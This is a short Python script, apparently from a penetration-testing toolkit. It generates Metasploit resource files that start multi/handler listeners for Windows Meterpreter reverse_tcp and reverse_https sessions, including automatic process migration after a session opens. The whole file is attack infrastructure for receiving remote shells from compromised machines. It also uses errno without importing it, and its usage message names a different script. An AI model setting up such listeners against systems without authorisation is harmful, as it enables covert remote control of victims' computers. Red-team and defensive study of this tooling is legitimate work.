#!/usr/bin/env python
#
# MetasploitListeners.py
# Simple python script to create multiple Meterpreter HTTPs handlers
# by Chris Campbell (obscuresec) editted by Brandon Martin and Cornel du Preez (stalwartsystems)
#
import sys
import os

def build(lhost,lport):
  listenerPath="/opt/local/malwaredefense"
#====================================================
  listenerFileName="{0}/{1}".format(listenerPath,"500-reverse_tcp_noenc.rc")
  options = "use multi/handler\n"
  options += "set payload windows/meterpreter/reverse_tcp\nset LHOST {0}\nset LPORT {1}\n".format(lhost,lport)
  options += "set ExitOnSession false\n"
  options += "set EnableStageEncoding false\n"
  options += "exploit -j\n"
  if not os.path.exists(os.path.dirname(listenerFileName)):
    try:
        os.makedirs(os.path.dirname(listenerFileName))
    except OSError as exc:
        if exc.errno != errno.EEXIST:
            raise
  with open(listenerFileName, "w") as f:
    f.write(options)
    f.close()


#====================================================



  listenerFileName="{0}/{1}".format(listenerPath,"501-reversehttps.rc")
  options = "use multi/handler\n"
  options += "set payload windows/meterpreter/reverse_https\nset LHOST {0}\nset LPORT {1}\n".format(lhost,lport)
  options += "set ExitOnSession false\n"
  options += "set EnableStageEncoding false\n"
  options += "set AutoRunScript post/windows/manage/smart_migrate\n"
  options += "exploit -j\n"
  if not os.path.exists(os.path.dirname(listenerFileName)):
    try:
        os.makedirs(os.path.dirname(listenerFileName))
    except OSError as exc:
        if exc.errno != errno.EEXIST:
            raise
  with open(listenerFileName, "w") as f:
    f.write(options)
    f.close()

#====================================================
  listenerFileName="{0}/{1}".format(listenerPath,"502-reverse_tcp.rc")
  options = "use multi/handler\n"
  options += "set payload windows/meterpreter/reverse_tcp\nset LHOST {0}\nset LPORT {1}\n".format(lhost,lport)
  options += "set ExitOnSession false\n"
  options += "set EnableStageEncoding true\n"
  options += "exploit -j\n"
  if not os.path.exists(os.path.dirname(listenerFileName)):
    try:
        os.makedirs(os.path.dirname(listenerFileName))
    except OSError as exc:
        if exc.errno != errno.EEXIST:
            raise
  with open(listenerFileName, "w") as f:
    f.write(options)
    f.close()






#grab args
try:
  lhost = sys.argv[1]
  lport = sys.argv[2]
  build(lhost,lport)

#index error
except IndexError:
  print "python StartListener.py lhost lport"




#unused code
#  subprocess.Popen("/usr/bin/msfconsole -r listener.rc", shell=True).wait()
